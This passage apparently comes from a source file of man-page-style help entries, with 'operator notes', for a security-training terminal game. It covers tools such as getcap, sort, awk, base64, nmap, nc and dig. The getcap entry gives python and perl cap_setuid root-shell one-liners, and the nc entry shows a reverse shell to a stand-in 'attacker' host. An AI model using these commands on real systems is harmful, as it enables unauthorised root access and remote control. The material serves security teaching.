              Change process UID to any user (including root/0).
              CRITICAL: Any interpreter (python, perl, ruby) with this
              capability can instantly become root.

       cap_setgid
              Change process GID to any group.

       cap_dac_override
              Bypass ALL file permission checks (read/write/execute).
              Equivalent to root file access.

       cap_dac_read_search
              Bypass file read and directory search permissions.

       cap_sys_admin
              Perform system administration operations: mount filesystems,
              configure kernel parameters, load modules. Very dangerous.

       cap_net_raw
              Use raw sockets (packet capture, custom protocols).
              Used legitimately by ping, but attackers use for sniffing.

       cap_net_bind_service
              Bind to privileged ports (<1024) without root.

EXAMPLES
       getcap /usr/bin/ping
              Check capabilities on ping binary.

       getcap -r / 2>/dev/null
              Recursively scan entire filesystem for capabilities.
              The 2>/dev/null hides "permission denied" errors.

       getcap -r /usr/bin 2>/dev/null
              Scan only /usr/bin for capabilities.

PRIVILEGE ESCALATION
       If you find an interpreter with cap_setuid:

       python3 with cap_setuid=ep:
              python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

       perl with cap_setuid=ep:
              perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'

       The setuid(0) call changes the process UID to root. Normally this
       would fail, but cap_setuid grants permission to make this call.
       The subsequent shell spawns as root.

OPERATOR NOTES
       Use getcap when you need to:
       • Enumerate privilege escalation vectors beyond SUID/SGID
       • Audit systems for dangerous capability assignments
       • Understand why certain binaries can perform privileged operations
       • Find misconfigurations that grant excessive permissions

       Pro tip: Capabilities are often overlooked during security audits.
       While everyone checks SUID bits (find -perm -4000), capabilities
       can be just as dangerous but less visible. Always run:
       getcap -r / 2>/dev/null

       Compare results against expected capabilities. Interpreters
       (python, perl, ruby, php) should NEVER have cap_setuid.

SEE ALSO
       setcap(8), capabilities(7), find(1), getfacl(1)`,

            // Text processing
            'sort': `SORT(1)                         User Commands                        SORT(1)

NAME
       sort - sort lines of text files

SYNOPSIS
       sort [OPTION]... [FILE]...

DESCRIPTION
       Write sorted concatenation of all FILE(s) to standard output.

       -b, --ignore-leading-blanks
              ignore leading blanks

       -f, --ignore-case
              fold lower case to upper case characters

       -n, --numeric-sort
              compare according to string numerical value

       -r, --reverse
              reverse the result of comparisons

       -u, --unique
              with -c, check for strict ordering; without -c, output only
              the first of an equal run

       -k, --key=KEYDEF
              sort via a key; KEYDEF gives location and type

       -t, --field-separator=SEP
              use SEP instead of non-blank to blank transition

EXAMPLES
       sort file.txt
              Sort lines alphabetically.

       sort -n numbers.txt
              Sort numerically.

       sort -r file.txt
              Sort in reverse order.

       sort -u file.txt
              Sort and remove duplicates.

       sort -t: -k3 -n /etc/passwd
              Sort passwd by UID (3rd field).

OPERATOR NOTES
       Use sort when you need to:
       • Organize data for analysis or deduplication
       • Prepare input for uniq (which requires sorted data)
       • Rank items by frequency, size, or other metrics
       • Order log entries or user lists for review

       Pro tip: sort | uniq -c | sort -rn is a powerful pattern.
       It counts occurrences and ranks by frequency - perfect for
       finding the most common IPs in logs, repeated commands in
       history, or frequent error messages. Master this combo.

SEE ALSO
       uniq(1), comm(1), join(1)`,

            'uniq': `UNIQ(1)                         User Commands                        UNIQ(1)

NAME
       uniq - report or omit repeated lines

SYNOPSIS
       uniq [OPTION]... [INPUT [OUTPUT]]

DESCRIPTION
       Filter adjacent matching lines from INPUT (or stdin), writing to
       OUTPUT (or stdout).

       Note: 'uniq' does not detect repeated lines unless they are adjacent.
       You may want to sort the input first, or use 'sort -u' without 'uniq'.

       -c, --count
              prefix lines by the number of occurrences

       -d, --repeated
              only print duplicate lines, one for each group

       -i, --ignore-case
              ignore differences in case when comparing

       -u, --unique
              only print unique lines

EXAMPLES
       sort file.txt | uniq
              Remove duplicate lines (after sorting).

       sort file.txt | uniq -c
              Count occurrences of each line.

       sort file.txt | uniq -d
              Show only duplicated lines.

OPERATOR NOTES
       Use uniq when you need to:
       • Remove duplicate entries after sorting
       • Count frequency of items with -c
       • Find repeated patterns (potential anomalies) with -d
       • Identify unique entries with -u

       Pro tip: uniq -c is essential for log analysis. Pipeline:
       cat access.log | cut -d' ' -f1 | sort | uniq -c | sort -rn
       This shows IPs by request count - useful for finding
       DDoS sources, scanners, or suspicious activity.

SEE ALSO
       sort(1), comm(1)`,

            'wc': `WC(1)                           User Commands                          WC(1)

NAME
       wc - print newline, word, and byte counts

SYNOPSIS
       wc [OPTION]... [FILE]...

DESCRIPTION
       Print  newline,  word,  and  byte  counts for each FILE, and a total
       line if more than one FILE is specified.  A word is  a  non-zero-length
       sequence of characters delimited by white space.

       With no FILE, or when FILE is -, read standard input.

       -c, --bytes
              print the byte counts

       -m, --chars
              print the character counts

       -l, --lines
              print the newline counts

       -w, --words
              print the word counts

       With no flags, wc prints lines, words, and bytes (in that order).

EXAMPLES
       wc file.txt
              Show lines, words, and bytes for file.txt.

       wc -l file.txt
              Count only the lines in file.txt.

       cat access.log | wc -l
              Count lines from piped input.

       grep "403" access.log | wc -l
              Count how many 403 errors in the log.

       ls | wc -l
              Count files in current directory.

OPERATOR NOTES
       Use wc when you need to:
       • Count occurrences after filtering with grep
       • Determine file sizes in lines/words/bytes
       • Verify expected data volume in outputs
       • Quick sanity check on command outputs

       Pro tip: wc -l is your quick counter. Common patterns:
       grep "Failed" auth.log | wc -l     # Count failed logins
       cat /etc/passwd | wc -l            # Count user accounts
       find . -type f | wc -l             # Count files recursively

       Combine with grep for instant statistics:
       grep -c pattern file               # grep's built-in counter
       grep pattern file | wc -l          # Same result, more flexible

SEE ALSO
       grep(1), cat(1)`,

            'cut': `CUT(1)                          User Commands                         CUT(1)

NAME
       cut - remove sections from each line of files

SYNOPSIS
       cut OPTION... [FILE]...

DESCRIPTION
       Print selected parts of lines from each FILE to standard output.

       -b, --bytes=LIST
              select only these bytes

       -c, --characters=LIST
              select only these characters

       -d, --delimiter=DELIM
              use DELIM instead of TAB for field delimiter

       -f, --fields=LIST
              select only these fields

       Use one, and only one of -b, -c or -f.

UNDERSTANDING FIELDS
       When you split a line by a delimiter, each piece becomes a "field"
       numbered starting at 1 (the leftmost piece).

       Example line: "192.168.1.1 admin GET /login.html"
       With delimiter=' ' (space), the fields are:

         Field 1: 192.168.1.1    (IP address)
         Field 2: admin          (username)
         Field 3: GET            (HTTP method)
         Field 4: /login.html    (path)

       So: cut -d ' ' -f 1  →  extracts "192.168.1.1"
           cut -d ' ' -f 4  →  extracts "/login.html"

FIELD SELECTION
       -f 1           First field only
       -f 3           Third field only
       -f 1,3         Fields 1 and 3
       -f 2-4         Fields 2, 3, and 4
       -f 1,3-5       Field 1 and fields 3 through 5

EXAMPLES
       cut -d: -f1 /etc/passwd
              Extract usernames (field 1) from passwd file.

       cut -c1-10 file.txt
              Extract first 10 characters of each line.

       cut -d, -f2,4 data.csv
              Extract 2nd and 4th fields from CSV.

       cut -d ' ' -f 1 access.log | sort | uniq
              Extract IPs from log, sort, and show unique values.

OPERATOR NOTES
       Use cut when you need to:
       • Extract specific fields from structured data (CSV, passwd, logs)
       • Pull usernames, UIDs, or shells from /etc/passwd
       • Isolate IP addresses or timestamps from log entries
       • Parse any colon, comma, or tab-delimited file

       Pro tip: cut is your go-to for colon-separated files.
       cut -d: -f1 /etc/passwd          # Usernames
       cut -d: -f3 /etc/passwd          # UIDs
       cut -d: -f7 /etc/passwd          # Login shells
       Combine with sort | uniq to analyze patterns.

SEE ALSO
       awk(1), paste(1), join(1)`,

            'tr': `TR(1)                           User Commands                          TR(1)

NAME
       tr - translate or delete characters

SYNOPSIS
       tr [OPTION]... SET1 [SET2]

DESCRIPTION
       Translate, squeeze, and/or delete characters from standard input,
       writing to standard output.

       -c, -C, --complement
              use the complement of SET1

       -d, --delete
              delete characters in SET1, do not translate

       -s, --squeeze-repeats
              replace each sequence of a repeated character with single occurrence

       SETs are specified as strings of characters. Interpreted sequences:
       \\n     new line
       \\t     horizontal tab
       a-z    all characters from a to z
       [:alnum:]  all letters and digits
       [:alpha:]  all letters
       [:digit:]  all digits
       [:lower:]  all lower case letters
       [:upper:]  all upper case letters

EXAMPLES
       echo "hello" | tr 'a-z' 'A-Z'
              Convert to uppercase.

       echo "hello   world" | tr -s ' '
              Squeeze multiple spaces to one.

       echo "hello123" | tr -d '0-9'
              Delete all digits.

OPERATOR NOTES
       Use tr when you need to:
       • Normalize case for consistent comparison
       • Remove or replace specific characters
       • Clean up whitespace in data
       • Simple character-level transformations

       Pro tip: tr is perfect for quick data cleaning.
       tr -d '\\r' < file               # Remove Windows carriage returns
       tr '[:upper:]' '[:lower:]'      # Normalize to lowercase
       tr -cd '[:print:]'              # Keep only printable characters
       Use with ROT13: tr 'A-Za-z' 'N-ZA-Mn-za-m' for simple encoding.

SEE ALSO
       sed(1), awk(1)`,

            'sed': `SED(1)                          User Commands                         SED(1)

NAME
       sed - stream editor for filtering and transforming text

SYNOPSIS
       sed 's/pattern/replacement/flags' filename

UNDERSTANDING THE SUBSTITUTION COMMAND
       The most common sed operation is substitution: s/old/new/

       Let's break down this command:
       sed 's/10.0.0.88/[REDACTED]/g' intel/access.log
       │    │ │         │          │  └── input file
       │    │ │         │          └── g = global (all occurrences)
       │    │ │         └── replacement text
       │    │ └── pattern to find
       │    └── s = substitute command
       └── the sed command

       Without 'g': replaces only FIRST match per line
       With 'g':    replaces ALL matches per line

THE SUBSTITUTION PATTERN
       s/old/new/flags

       s         The substitute command
       /         Delimiter (separates the parts)
       old       What to find (can be text or regex)
       new       What to replace it with
       flags     Optional: g=global, i=ignore case

       The delimiter doesn't have to be /. These are equivalent:
       sed 's/old/new/g'
       sed 's|old|new|g'
       sed 's#old#new#g'

COMMON FLAGS
       g      Global - replace ALL occurrences, not just first
       i      Case-insensitive matching
       p      Print the line (use with -n)

PRACTICAL EXAMPLES
       Redact an IP address in a log file:
       sed 's/10.0.0.88/[REDACTED]/g' intel/access.log

       Replace text (first occurrence only):
       sed 's/error/ERROR/' logfile.txt

       Replace ALL occurrences (global):
       sed 's/error/ERROR/g' logfile.txt

       Delete lines containing a pattern:
       sed '/pattern/d' file.txt

       Print only lines matching pattern:
       sed -n '/403/p' access.log

OPTIONS
       -n     Suppress automatic printing (use with /p)
       -i     Edit file in place (careful - modifies original!)
       -e     Chain multiple expressions

OPERATOR NOTES
       Use sed when you need to:
       • Redact sensitive data (IPs, names, credentials)
       • Search and replace across files
       • Delete lines matching a pattern
       • Transform data in pipelines

       Pro tip: Always test without -i first!
       sed 's/secret/REDACTED/g' file    # Preview changes
       sed -i 's/secret/REDACTED/g' file # Actually modify file

SEE ALSO
       awk(1), grep(1), tr(1)`,

            'awk': `AWK(1)                          User Commands                         AWK(1)

NAME
       awk - pattern scanning and processing language

SYNOPSIS
       awk -F'delimiter' '{print $fieldnum}' filename

UNDERSTANDING THE AWK COMMAND
       Let's break down this command:
       awk -F: '{print $1}' intel/users.db
       │   │ │  │     │ │   └── input file
       │   │ │  │     │ └── $1 = first field
       │   │ │  │     └── print command
       │   │ │  └── action block (in curly braces)
       │   │ └── colon as field separator
       │   └── -F = Field separator flag
       └── the awk command

FIELD NUMBERS ($1, $2, etc.)
       When awk reads a line, it splits it by the delimiter.
       Each piece becomes a numbered field:

       Example line from users.db:
       admin:x:1000:1000:System Admin:/home/admin:/bin/bash

       With -F: (colon delimiter):
         $1 = admin           (username)
         $2 = x               (password placeholder)
         $3 = 1000            (UID)
         $4 = 1000            (GID)
         $5 = System Admin    (full name)
         $6 = /home/admin     (home directory)
         $7 = /bin/bash       (shell)
         $0 = entire line

       So: awk -F: '{print $1}' users.db  →  prints "admin"
           awk -F: '{print $7}' users.db  →  prints "/bin/bash"

THE -F FLAG (FIELD SEPARATOR)
       -F:      Use colon as delimiter
       -F,      Use comma as delimiter (CSV files)
       -F'\\t'  Use tab as delimiter
       -F' '    Use space as delimiter (default)

PRINT MULTIPLE FIELDS
       awk -F: '{print $1, $3}' file     Print fields 1 and 3
       awk -F: '{print $1 ":" $3}' file  Print with colon between
       awk -F, '{print $2, $4}' data.csv Print fields 2 and 4 from CSV

PRACTICAL EXAMPLES
       Extract usernames from passwd-style file:
       awk -F: '{print $1}' intel/users.db

       Extract usernames and shells:
       awk -F: '{print $1, $7}' intel/users.db

       Extract names from CSV (comma-separated):
       awk -F, '{print $2}' data/employees.csv

       Print specific columns from space-delimited log:
       awk '{print $1, $9}' intel/access.log

BUILT-IN VARIABLES
       $0     The entire line
       $1-$n  The nth field
       NR     Current line number
       NF     Number of fields in current line
       $NF    The LAST field (useful!)

OPERATOR NOTES
       Use awk when you need to:
       • Extract specific columns from structured data
       • Process passwd files, CSVs, logs
       • Print multiple fields with formatting
       • More power than cut (supports logic and math)

       awk vs cut:
       • cut is simpler, faster for basic extraction
       • awk can do math, conditionals, multiple actions
       • Use cut for simple jobs, awk for complex ones

SEE ALSO
       cut(1), sed(1), grep(1)`,

            'tee': `TEE(1)                          User Commands                         TEE(1)

NAME
       tee - read from standard input and write to standard output and files

SYNOPSIS
       tee [OPTION]... [FILE]...

DESCRIPTION
       Copy standard input to each FILE, and also to standard output.

       -a, --append
              append to the given FILEs, do not overwrite

       -i, --ignore-interrupts
              ignore interrupt signals

EXAMPLES
       ls -la | tee output.txt
              List files and save to output.txt.

       command | tee -a log.txt
              Append output to log file.

       command | tee file1.txt file2.txt
              Write to multiple files.

OPERATOR NOTES
       Use tee when you need to:
       • Save command output while still viewing it
       • Log operations for later review
       • Write to multiple locations simultaneously
       • Create audit trails of your commands

       Pro tip: tee is essential for operational documentation.
       ./exploit.sh | tee -a operation.log    # Log and watch
       command | tee >(grep error > errors.txt)  # Process tee with pipe
       Use sudo with tee: echo "text" | sudo tee /etc/file
       This bypasses the "permission denied" on redirects.

SEE ALSO
       cat(1)`,

            'xargs': `XARGS(1)                        User Commands                       XARGS(1)

NAME
       xargs - build and execute command lines from standard input

SYNOPSIS
       xargs [options] [command [initial-arguments]]

DESCRIPTION
       This manual page documents the GNU version of xargs.  xargs reads items
       from the standard input, delimited by blanks or newlines, and executes
       the command one or more times with any initial-arguments followed by
       items read from standard input.

       -0, --null
              Input items are terminated by a null character instead of whitespace.

       -I replace-str
              Replace occurrences of replace-str in the initial-arguments.

       -n max-args
              Use at most max-args arguments per command line.

       -p, --interactive
              Prompt the user about whether to run each command.

EXAMPLES
       find . -name "*.txt" | xargs rm
              Delete all .txt files.

       find . -name "*.log" | xargs grep "error"
              Search for "error" in all .log files.

       cat files.txt | xargs -I {} cp {} /backup/
              Copy each file listed to /backup/.

OPERATOR NOTES
       Use xargs when you need to:
       • Execute commands on lists of files from find or other tools
       • Batch process multiple items efficiently
       • Work around "argument list too long" errors
       • Build complex command pipelines

       Pro tip: xargs is find's best friend. Essential patterns:
       find . -name "*.log" -print0 | xargs -0 grep "error"  # Safe with spaces
       cat hosts.txt | xargs -I {} ssh {} "uptime"  # Run on multiple hosts
       find . -type f | xargs -n 1 md5sum  # Hash files one at a time
       Use -print0 with -0 for filenames containing spaces or special chars.

SEE ALSO
       find(1), exec(3)`,

            // Crypto
            'base64': `BASE64(1)                       User Commands                      BASE64(1)

NAME
       base64 - base64 encode/decode data and print to standard output

SYNOPSIS
       base64 [OPTION]... [FILE]

DESCRIPTION
       Base64 encode or decode FILE, or standard input, to standard output.

       -d, --decode
              decode data

       -i, --ignore-garbage
              when decoding, ignore non-alphabet characters

       -w, --wrap=COLS
              wrap encoded lines after COLS character (default 76).
              Use 0 to disable line wrapping.

EXAMPLES
       echo "Hello World" | base64
              Encode string to base64.

       echo "SGVsbG8gV29ybGQ=" | base64 -d
              Decode base64 string.

       base64 file.bin > file.b64
              Encode binary file.

OPERATOR NOTES
       Use base64 when you need to:
       • Decode obfuscated payloads in malware or scripts
       • Encode binary data for transport over text protocols
       • Analyze suspicious encoded strings in configs or logs
       • Prepare data for web requests or APIs

       Pro tip: Base64 is everywhere in malware and web attacks.
       Look for it in: shell scripts, cron jobs, web shells, email headers.
       Decode suspicious strings: echo "string" | base64 -d
       Watch for double-encoding: base64 -d | base64 -d
       Common in PowerShell attacks: -EncodedCommand uses base64.

SEE ALSO
       uuencode(1), uudecode(1)`,

            'md5sum': `MD5SUM(1)                       User Commands                      MD5SUM(1)

NAME
       md5sum - compute and check MD5 message digest

SYNOPSIS
       md5sum [OPTION]... [FILE]...

DESCRIPTION
       Print or check MD5 (128-bit) checksums.

       -b, --binary
              read in binary mode

       -c, --check
              read MD5 sums from the FILEs and check them

       -t, --text
              read in text mode (default)

       --quiet
              don't print OK for each successfully verified file

       --status
              don't output anything, status code shows success

       -w, --warn
              warn about improperly formatted checksum lines

EXAMPLES
       md5sum file.txt
              Print MD5 hash of file.

       md5sum *.iso > checksums.md5
              Create checksum file.

       md5sum -c checksums.md5
              Verify checksums.

OPERATOR NOTES
       Use md5sum when you need to:
       • Verify file integrity (detect tampering)
       • Create file fingerprints for comparison
       • Check downloaded files against known hashes
       • Identify known malware by hash signature

       Pro tip: MD5 is fast but cryptographically broken - don't use
       for security-critical applications. Still useful for:
       • Quick file identification and deduplication
       • Searching malware databases (VirusTotal accepts MD5)
       • Verifying downloads match published hashes
       Use sha256sum for security-sensitive verification.

SEE ALSO
       sha1sum(1), sha256sum(1), sha512sum(1)`,

            'sha256sum': `SHA256SUM(1)                    User Commands                   SHA256SUM(1)

NAME
       sha256sum - compute and check SHA256 message digest

SYNOPSIS
       sha256sum [OPTION]... [FILE]...

DESCRIPTION
       Print or check SHA256 (256-bit) checksums.

       -b, --binary
              read in binary mode

       -c, --check
              read SHA256 sums from the FILEs and check them

       --quiet
              don't print OK for each successfully verified file

       --status
              don't output anything, status code shows success

EXAMPLES
       sha256sum file.iso
              Print SHA256 hash of file.

       sha256sum -c SHA256SUMS
              Verify checksums from file.

OPERATOR NOTES
       Use sha256sum when you need to:
       • Securely verify file integrity
       • Generate cryptographic fingerprints for evidence
       • Validate software downloads and updates
       • Create forensic chain of custody records

       Pro tip: SHA256 is the current standard for secure hashing.
       Always use SHA256 (not MD5 or SHA1) for:
       • Forensic evidence documentation
       • Malware sample identification
       • Verifying OS images and security tools
       Document hashes before and after analysis to prove integrity.

SEE ALSO
       md5sum(1), sha1sum(1), sha512sum(1)`,

            'sha1sum': `SHA1SUM(1)                      User Commands                     SHA1SUM(1)

NAME
       sha1sum - compute and check SHA1 message digest

SYNOPSIS
       sha1sum [OPTION]... [FILE]...

DESCRIPTION
       Print or check SHA1 (160-bit) checksums.

       WARNING: SHA1 is no longer considered secure for cryptographic purposes.
       Use SHA256 or SHA512 for security-critical applications.

       -c, --check
              read SHA1 sums from the FILEs and check them

EXAMPLES
       sha1sum file.txt
              Print SHA1 hash of file.

OPERATOR NOTES
       Use sha1sum when you need to:
       • Check legacy systems that still use SHA1
       • Verify Git commit hashes (Git uses SHA1)
       • Match older malware signatures or IOCs
       • Compare against historical hash databases

       Pro tip: SHA1 is DEPRECATED for security use (collision attacks
       proven in 2017). However, you'll still encounter it:
       • Git repositories use SHA1 for commits
       • Older security tools and databases
       • Legacy verification systems
       Always prefer sha256sum for new verification tasks.

SEE ALSO
       md5sum(1), sha256sum(1)`,

            'strings': `STRINGS(1)                      User Commands                     STRINGS(1)

NAME
       strings - print the sequences of printable characters in files

SYNOPSIS
       strings [options] file...

DESCRIPTION
       For each file given, GNU strings prints the printable character
       sequences that are at least 4 characters long and are followed by
       an unprintable character.

       -a, --all
              Scan the whole file, regardless of what sections it contains.

       -n min-len, --bytes=min-len
              Print sequences of at least min-len characters (default 4).

       -t radix, --radix=radix
              Print the offset within the file before each string.

EXAMPLES
       strings /bin/ls
              Extract readable strings from binary.

       strings -n 8 malware.bin
              Find strings at least 8 characters long.

       strings -t x binary
              Show hex offset of each string.

OPERATOR NOTES
       Use strings when you need to:
       • Extract readable text from binary files or memory dumps
       • Find hardcoded credentials, URLs, or IPs in executables
       • Identify malware capabilities from embedded strings
       • Reverse engineer unknown binaries

       Pro tip: strings is your first tool for binary analysis.
       Look for: URLs, IP addresses, file paths, error messages,
       function names, registry keys, command strings.
       strings malware.exe | grep -E "(http|password|cmd|admin)"
       Combine with grep for targeted hunting. Use -t x to find
       string locations for deeper analysis with hex editors.

SEE ALSO
       nm(1), objdump(1)`,

            // Security/Network
            'nmap': `NMAP(1)                     Nmap Reference Guide                     NMAP(1)

NAME
       nmap - Network exploration tool and security / port scanner

SYNOPSIS
       nmap [Scan Type...] [Options] {target specification}

DESCRIPTION
       Nmap ("Network Mapper") is a free and open source utility for network
       discovery and security auditing.

       -sS    TCP SYN scan (default, requires root)
       -sT    TCP connect scan
       -sU    UDP scan
       -sV    Probe open ports to determine service/version info
       -sC    Perform a script scan using the default set of scripts
       -O     Enable OS detection
       -A     Enable OS detection, version detection, script scanning, and traceroute

       -p port ranges
              Only scan specified ports. Ex: -p22; -p1-65535; -p U:53,T:21-25

       -p-    Scan all 65535 ports

       -Pn    Treat all hosts as online -- skip host discovery

       -v     Increase verbosity level

       -oN/-oX/-oS/-oG <file>
              Output scan in normal, XML, s|<rIpt kIddi3, and Grepable format

EXAMPLES
       nmap 192.168.1.1
              Basic scan of single host.

       nmap -sV -p 1-1000 target.com
              Version detection on ports 1-1000.

       nmap -A -T4 scanme.nmap.org
              Aggressive scan with faster timing.

       nmap -sn 192.168.1.0/24
              Ping scan to discover hosts.

OPERATOR NOTES
       Use nmap when you need to:
       • Discover live hosts on a network segment
       • Enumerate open ports and running services
       • Identify operating systems and service versions
       • Find potential vulnerabilities and entry points

       Pro tip: Nmap is THE network reconnaissance tool. Master this workflow:
       1. nmap -sn 192.168.1.0/24         # Host discovery first
       2. nmap -sV -sC -p- target         # Full port scan + scripts
       3. nmap --script vuln target       # Vulnerability scan

       Use -oA basename to save all output formats simultaneously.
       NSE scripts (--script) extend nmap into a vulnerability scanner.
       Always get authorization before scanning networks you don't own.

SEE ALSO
       https://nmap.org/book/man.html`,

            'nc': `NC(1)                         BSD General Commands Manual                        NC(1)

NAME
     nc -- arbitrary TCP and UDP connections and listens

SYNOPSIS
     nc [-46DdhklnrStUuvz] [-i interval] [-p source_port] [-s source_ip_address]
        [-w timeout] [-X proxy_protocol] [-x proxy_address[:port]]
        [hostname] [port[s]]

DESCRIPTION
     The nc (or netcat) utility is used for just about anything under the sun
     involving TCP or UDP.  It can open TCP connections, send UDP packets,
     listen on arbitrary TCP and UDP ports, do port scanning, and deal with
     both IPv4 and IPv6.

     -l      Listen for an incoming connection rather than initiating one.

     -p source_port
             Specify the source port nc should use.

     -u      Use UDP instead of the default TCP.

     -v      Produce more verbose output.

     -z      Only scan for listening daemons, without sending any data.

     -w timeout
             Connections which cannot be established timeout after timeout seconds.

EXAMPLES
     nc -l 1234
             Listen on port 1234.

     nc host.example.com 80
             Connect to port 80 of host.example.com.

     echo "GET /" | nc host.example.com 80
             Send HTTP request.

     nc -zv host.example.com 20-30
             Port scan ports 20-30.

OPERATOR NOTES
     Use nc (netcat) when you need to:
     • Create quick TCP/UDP connections for testing
     • Set up listeners to receive incoming connections
     • Transfer files between systems without scp
     • Debug network services by hand-crafting requests

     Pro tip: Netcat is the "Swiss Army knife" of networking.
     Reverse shell:    nc -e /bin/sh attacker 4444  (on target)
                       nc -lvp 4444                  (on attacker)
     File transfer:    nc -l 1234 > received.txt   (receiver)
                       nc target 1234 < send.txt   (sender)
     Banner grab:      echo "" | nc -v target 22
     Port check:       nc -zv target 22 80 443

SEE ALSO
     cat(1), ssh(1), nmap(1)`,

            'netcat': `NETCAT(1)                   BSD General Commands Manual                   NETCAT(1)

NAME
     netcat -- see nc(1)

DESCRIPTION
     netcat is an alias for nc. See nc(1) for full documentation.

SEE ALSO
     nc(1)`,

            'tcpdump': `TCPDUMP(1)                      User Commands                     TCPDUMP(1)

NAME
       tcpdump - dump traffic on a network

SYNOPSIS
       tcpdump [ -AbdDefhHIJKlLnNOpqStuUvxX# ] [ -B buffer_size ]
               [ -c count ] [ -C file_size ] [ -G rotate_seconds ]
               [ -i interface ] [ -w file ] [ -r file ]
               [ expression ]

DESCRIPTION
       Tcpdump prints out a description of the contents of packets on a
       network interface that match the boolean expression.

       -c count
              Exit after receiving count packets.

       -i interface
              Listen on interface. If unspecified, tcpdump searches the system
              interface list for the lowest numbered, configured up interface.

       -n     Don't convert addresses to names.

       -nn    Don't convert protocol and port numbers to names.

       -v     Verbose output. For example, the time to live, identification,
              total length and options in an IP packet are printed.

       -w file
              Write the raw packets to file rather than printing them out.

       -r file
              Read packets from file (which was created with the -w option).

EXPRESSION
       Selects which packets will be dumped. Examples:
       host hostname    - packets to or from hostname
       port 80          - packets to or from port 80
       tcp              - TCP packets only
       src host         - packets from host
       dst port 443     - packets to port 443

EXAMPLES
       tcpdump -i eth0
              Capture on eth0 interface.

       tcpdump -c 100 -w capture.pcap
              Capture 100 packets to file.

       tcpdump port 80 or port 443
              Capture HTTP and HTTPS traffic.

       tcpdump -n host 192.168.1.1
              Traffic to/from specific IP.

OPERATOR NOTES
       Use tcpdump when you need to:
       • Capture network traffic for analysis
       • Monitor for suspicious connections in real-time
       • Create packet captures for Wireshark analysis
       • Debug network connectivity issues

       Pro tip: tcpdump requires root/sudo for raw packet capture.
       Capture to file for later analysis:
       tcpdump -i any -w evidence.pcap -c 10000

       Hunt for suspicious traffic:
       tcpdump 'tcp[tcpflags] & (tcp-syn) != 0'  # SYN packets
       tcpdump 'port 4444 or port 5555'          # Common backdoor ports
       tcpdump -A 'port 80'                       # ASCII HTTP content
       Always use -w for evidence - pcap files preserve everything.

SEE ALSO
       wireshark(1), tshark(1)`,

            'whois': `WHOIS(1)                        User Commands                       WHOIS(1)

NAME
       whois - client for the whois directory service

SYNOPSIS
       whois [OPTION]... OBJECT...

DESCRIPTION
       whois searches for an object in a RFC 3912 database.

       -h HOST, --host HOST
              Connect to HOST.

       -p PORT, --port PORT
              Connect to PORT.

EXAMPLES
       whois example.com
              Query domain information.

       whois 8.8.8.8
              Query IP address information.

       whois -h whois.arin.net 8.8.8.8
              Query specific whois server.

OPERATOR NOTES
       Use whois when you need to:
       • Identify domain ownership and registration details
       • Find IP address allocation and organization info
       • Research infrastructure during OSINT gathering
       • Investigate suspicious domains or IPs

       Pro tip: WHOIS is essential for OSINT and attribution.
       Key information to look for:
       • Registrant name, email, organization
       • Name servers (reveal hosting infrastructure)
       • Creation/expiration dates (new domains are suspicious)
       • Abuse contact for reporting

       Many domains use privacy protection - check historical
       WHOIS records at archive services for original data.

SEE ALSO
       dig(1), nslookup(1)`,

            'dig': `DIG(1)                         BIND9                                  DIG(1)

NAME
       dig - DNS lookup utility

SYNOPSIS
       dig [@server] [-b address] [-c class] [-f filename] [-k filename]
           [-m] [-p port#] [-q name] [-t type] [-v] [-x addr]
           [-y [hmac:]name:key] [name] [type] [class] [queryopt...]

DESCRIPTION
       dig is a flexible tool for interrogating DNS name servers.

       -x addr
              Simplified reverse lookups.

       @server
              DNS server to query.

       +short
              Display only the answer.

       +trace
              Trace the delegation path.

EXAMPLES
       dig example.com
              Query A record.

       dig example.com MX
              Query MX records.

       dig @8.8.8.8 example.com
              Query specific DNS server.

       dig -x 8.8.8.8
              Reverse lookup.

       dig +short example.com
              Short answer only.

OPERATOR NOTES
       Use dig when you need to:
       • Resolve domain names to IP addresses
       • Enumerate DNS records (A, AAAA, MX, NS, TXT, CNAME)
       • Trace DNS delegation chains
       • Verify DNS configuration and propagation

       Pro tip: dig is more powerful than nslookup for DNS recon.
       dig example.com ANY          # All records (if allowed)
       dig example.com TXT          # Often contains SPF, DKIM, verification
       dig +trace example.com       # Full delegation path
       dig -x IP                    # Reverse lookup (PTR record)
       dig @ns1.example.com example.com axfr  # Zone transfer attempt

SEE ALSO
       nslookup(1), host(1)`,

            'nslookup': `NSLOOKUP(1)                      BIND9                           NSLOOKUP(1)

NAME
       nslookup - query Internet name servers interactively

SYNOPSIS
       nslookup [-option] [name | -] [server]

DESCRIPTION
       Nslookup is a program to query Internet domain name servers.

EXAMPLES
       nslookup example.com
              Query default DNS server.

       nslookup example.com 8.8.8.8
              Query specific DNS server.

       nslookup -type=mx example.com
              Query MX records.

       nslookup -type=ns example.com
              Query name servers.

OPERATOR NOTES
       Use nslookup when you need to:
       • Quickly resolve hostnames to IPs
       • Check DNS server responses
       • Query specific record types
       • Troubleshoot DNS resolution issues

       Pro tip: nslookup is simpler than dig but less powerful.
       Use for quick lookups; prefer dig for detailed analysis.
       nslookup -type=any domain.com   # All records
       Interactive mode: just type 'nslookup' then enter queries.
       For serious DNS recon, use dig instead.

SEE ALSO
       dig(1), host(1)`,

            'ping': `PING(8)                     System Manager's Manual                    PING(8)

NAME
       ping - send ICMP ECHO_REQUEST to network hosts

SYNOPSIS
       ping [-aAbBdDfhLnOqrRUvV46] [-c count] [-i interval] [-I interface]
            [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern]
            [-Q tos] [-s packetsize] [-S sndbuf] [-t ttl]
            [-T timestamp option] [-w deadline] [-W timeout] [hop...]
            {destination}

DESCRIPTION
       ping uses the ICMP protocol's ECHO_REQUEST datagram to elicit an
       ICMP ECHO_RESPONSE from a host or gateway.

       -c count
              Stop after sending count ECHO_REQUEST packets.

       -i interval
              Wait interval seconds between sending each packet.

       -s packetsize
              Specifies the number of data bytes to be sent.

       -t ttl
              Set the IP Time to Live.

       -W timeout
              Time to wait for a response, in seconds.

EXAMPLES
       ping google.com
              Ping continuously.

       ping -c 4 192.168.1.1
              Send 4 pings.

       ping -i 0.5 -c 10 host
              Ping 10 times, 0.5s interval.

OPERATOR NOTES
       Use ping when you need to:
       • Test basic network connectivity to a host
       • Verify a host is alive and responding
       • Measure round-trip latency
       • Troubleshoot network path issues

       Pro tip: ping is your first network diagnostic tool.
       No response could mean: host down, firewall blocking ICMP,
       or routing issues. Check with other tools if ping fails.
       ping -c 1 -W 1 host && echo "up" || echo "down"  # Quick check
